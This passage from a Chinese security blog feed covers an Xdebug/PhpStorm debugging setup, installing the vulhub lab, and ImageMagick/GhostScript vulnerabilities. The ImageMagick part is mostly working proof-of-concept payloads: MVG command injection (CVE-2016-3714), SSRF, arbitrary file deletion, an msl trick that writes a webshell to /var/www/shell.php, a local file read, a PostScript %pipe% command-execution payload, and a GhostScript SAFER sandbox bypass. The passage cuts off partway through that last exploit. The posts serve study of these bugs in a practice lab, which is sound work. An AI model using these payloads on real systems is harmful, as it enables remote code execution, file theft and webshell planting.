class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">;主机端口，重要！！！！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_port&#x3D;9001</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">;开启自动跟踪</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">xdebug.auto_trace &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">;开启异常跟踪</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">xdebug.show_exception_trace &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">;开启远程调试自动启动</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_autostart &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">;收集变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_vars &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">;收集返回值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_return &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">;收集参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_params &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">;临时跟踪信息输出，按需修改</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">;xdebug.trace_output_dir&#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">;显示局部变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">xdebug.show_local_vars &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">xdebug.profiler_enable &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">;xdebug.profiler_output_dir &#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">xdebug.trace_enable_trigger &#x3D;On</span></pre></td></tr></table></figure></li><li><p>重启apache服务</p></li></ol><h2 id="phpstorm配置"><a href="#phpstorm配置" class="headerlink" title="phpstorm配置"></a>phpstorm配置</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>每步配置完成后需点击右下角：<code>Apply</code>！！！</p><h3 id="php解释器配置"><a href="#php解释器配置" class="headerlink" title="php解释器配置"></a>php解释器配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP</p><p>php版本7.3.4。其他的正常配置解释器即可。</p><h3 id="debug配置"><a href="#debug配置" class="headerlink" title="debug配置"></a>debug配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug</p><p>此步只需更改<code>X-debug port</code>为9001，即第二步在php.ini中配置项为<code>xdebug.remote_port</code>的值</p><h3 id="DBGp-Proxy配置"><a href="#DBGp-Proxy配置" class="headerlink" title="DBGp Proxy配置"></a>DBGp Proxy配置</h3><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug-&gt;DBGp Proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">IDE key:PHPSTORM</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;第二步在php.ini中配置项为xdebug.idekey的值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">HOST:http:&#x2F;&#x2F;test.com</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;为要调试的项目配置的网站。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;不要用类似于http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Port:80</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;服务器的监听地址</span></pre></td></tr></table></figure><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Server</p><ol><li>点加号添加，Name随便，下面要用。</li><li>Host填调试项目网站。eg:<a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li><li>Port:80 </li><li>Debugger:Xdebug</li></ol><h3 id="最终调试前配置"><a href="#最终调试前配置" class="headerlink" title="最终调试前配置"></a>最终调试前配置</h3><p>Run-&gt;Edit Configurations</p><ol><li>点击<code>+</code></li><li>选择Php Web Page</li><li>Name随便</li><li>Server选择上一步添加Server的Name</li><li>Start URL: <a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li><li>Browser: Chrome</li></ol><p>配置完毕</p><h3 id="食用"><a href="#食用" class="headerlink" title="食用"></a>食用</h3><p>浏览器的<code>Xdebuger helper</code>选择<code>Debug</code></p><p>phpstorm点击右上角电话图标开始监听</p><p>phpstorm点击右上角甲壳虫图标开始调试</p><p>注意不能浏览器直接访问，要点击甲壳虫图标</p><p>如果浏览器访问时，url参数含有<code>XDEBUG_SESSION_START=XXXXX</code>参数，cookie中有 <code>XDEBUG_SESSION =PHPSTORM</code>则成功</p><h3 id="后续调试超时问题"><a href="#后续调试超时问题" class="headerlink" title="后续调试超时问题"></a>后续调试超时问题</h3><p>调试时，还没调试几十秒钟就超时了。设置一下。</p><p>找到httpd.conf</p><p>查找 <code>LoadModule fcgid_module modules/mod_fcgid.so</code>模块，保证不被注释</p><p>在末尾添加以下配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;IfModule fcgid_module&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> FcgidProcessLifeTime 8200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> FcgidIOTimeout 8200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"> FcgidConnectTimeout 4000</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> &lt;&#x2F;IfModule&gt;</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      phpstudy8.0.9(2019)+phpstorm2019+xdebug特定版本的详细配置，搭建调试环境。便于php代码的动态审计。
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="php" scheme="http://h3art3ars.github.io/tags/php/"/>
    
      <category term="调试" scheme="http://h3art3ars.github.io/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>vulhub简单安装</title>
    <link href="http://h3art3ars.github.io/2019/12/11/vulhub-install/"/>
    <id>http://h3art3ars.github.io/2019/12/11/vulhub-install/</id>
    <published>2019-12-11T07:53:39.000Z</published>
    <updated>2019-12-11T07:56:22.354Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulhub-安装使用"><a href="#vulhub-安装使用" class="headerlink" title="vulhub  安装使用"></a>vulhub  安装使用</h1><h3 id="已备环境"><a href="#已备环境" class="headerlink" title="已备环境"></a>已备环境</h3><ol><li>python3</li><li>docker</li></ol><h3 id="安装其他环境"><a href="#安装其他环境" class="headerlink" title="安装其他环境"></a>安装其他环境</h3><ol><li><p>启动docker服务</p><p><code>service docker start</code></p></li><li><p>安装docker-compose</p><p><code>pip3 install docker-compose</code></p></li></ol><h3 id="下载vulhub并解压"><a href="#下载vulhub并解压" class="headerlink" title="下载vulhub并解压"></a>下载vulhub并解压</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;archive&#x2F;master.zip -O vulhub-master.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">cd vulhub-master</span></pre></td></tr></table></figure><h3 id="选择并享用"><a href="#选择并享用" class="headerlink" title="选择并享用"></a>选择并享用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cd ****&#x2F;****</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">docker-compose build</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      安装vulhub以用来建立docker环境供自己练习
    
    </summary>
    
    
      <category term="学习" scheme="http://h3art3ars.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="学习" scheme="http://h3art3ars.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="漏洞利用" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ImageMagick</title>
    <link href="http://h3art3ars.github.io/2019/12/11/ImageMagick/"/>
    <id>http://h3art3ars.github.io/2019/12/11/ImageMagick/</id>
    <published>2019-12-11T07:46:16.000Z</published>
    <updated>2019-12-14T02:44:06.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h1><ul><li><h2 id="Bypass-code"><a href="#Bypass-code" class="headerlink" title="Bypass code"></a>Bypass code</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $_FILES[&#39;image&#39;][&#39;tmp_name&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$size &#x3D; getimagesize($filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">if ($size &amp;&amp; $size[0] &gt; 100 &amp;&amp; $size[1] &gt; 100) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    $img &#x3D; new Imagick($_FILES[&#39;image&#39;][&#39;tmp_name&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $img-&gt;cropThumbnailImage(100, 100);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    $img-&gt;writeImage(&#39;newimage.gif&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h3 id="ImageMagick漏洞"><a href="#ImageMagick漏洞" class="headerlink" title="ImageMagick漏洞"></a>ImageMagick漏洞</h3><ul><li><p>ImageMagick 6.9.3-9 </p></li><li><h3 id="CVE-2016-3714"><a href="#CVE-2016-3714" class="headerlink" title="CVE-2016-3714"></a>CVE-2016-3714</h3><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p><p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的。</p><p>调用的漏洞委托：</p><p><code>&lt;delegate decode=&quot;https&quot; command=&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;/&gt;</code></p><p>漏洞poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|id;&quot;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3718"><a href="#CVE-2016-3718" class="headerlink" title="CVE-2016-3718"></a>CVE-2016-3718</h3><p> 利用mvg格式中可以包含url的特点，进行SSRF攻击 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(http:&#x2F;&#x2F;example.com&#x2F;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h3><p> 利用ImageMagick支持的ephemeral协议，来删除任意文件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;ephemeral:&#x2F;tmp&#x2F;delete.txt&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h3><p> ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell </p><p> 特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">file_move.mvg</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;msl:&#x2F;tmp&#x2F;msl.txt&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;msl.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&lt;image&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&lt;read filename&#x3D;&quot;&#x2F;tmp&#x2F;image.gif&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&lt;write filename&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;shell.php&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;image&gt;</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3717"><a href="#CVE-2016-3717" class="headerlink" title="CVE-2016-3717"></a>CVE-2016-3717</h3><p> 造成本地文件读取漏洞： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;label:@&#x2F;etc&#x2F;hosts&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="Pocs"><a href="#Pocs" class="headerlink" title="Pocs"></a>Pocs</h3><p><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">Pocs</a></p></li></ul></li></ul><ul><li><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><ul><li><p>漏洞代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  new Imagick(&#39;vul.gif&#39;);</span></pre></td></tr></table></figure><p>无返回值，需从日志读取</p></li><li><h3 id="ImageMagick内存泄漏漏洞（CVE-2018-16323）"><a href="#ImageMagick内存泄漏漏洞（CVE-2018-16323）" class="headerlink" title="ImageMagick内存泄漏漏洞（CVE-2018-16323）"></a>ImageMagick内存泄漏漏洞（CVE-2018-16323）</h3></li><li><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li><p>生成PoC（ps文件）；</p></li><li><p>上传即可</p></li></ol></li><li><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) currentdevice putdeviceprops</span></pre></td></tr></table></figure></li><li><h3 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h3></li></ul></li></ul><ul><li><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>生成poc</li><li>上传即可</li></ol></li><li><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;.actual_pdfpaintproc pdfdict &#x2F;.actual_pdfpaintproc get def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;exploit &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    (Stage 11: Exploitation...)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#x2F;forceput exch def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;SAFER false forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    userparams &#x2F;LockFilePermissions false forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileControl [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileWriting [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileReading [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    % update</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    save restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    % All done.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    stop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">&#125; def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">errordict &#x2F;typecheck &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    &#x2F;typecount typecount 1 add def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    (Stage 10: &#x2F;typecheck #)&#x3D;only typecount &#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    % The first error will be the .knownget, which we handle and setup the</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">    % dump the operands.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">    typecount 1 eq &#123; null &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    typecount 3 eq &#123; (unexpected)&#x3D; quit &#125;  if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">&#125; put</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">% marked as executeonly or pseudo-operators.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">% fail because when the routine was declared, it used &#96;bind&#96; but many of the</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">% works.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">&lt;&lt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">    &#x2F;typecount      0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    &#x2F;PDFfile        &#123; (Stage 0: PDFfile)&#x3D; currentfile &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    &#x2F;q              &#123; (Stage 1: q)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">    &#x2F;oget           &#123; (Stage 3: oget)&#x3D; pop pop 0 &#125; % clear stack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfemptycount  &#123; (Stage 4: pdfemptycount)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">    &#x2F;gput           &#123; (Stage 5: gput)&#x3D; &#125;  % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">    &#x2F;resolvestream  &#123; (Stage 6: resolvestream)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfopdict      &#123; (Stage 7: pdfopdict)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td 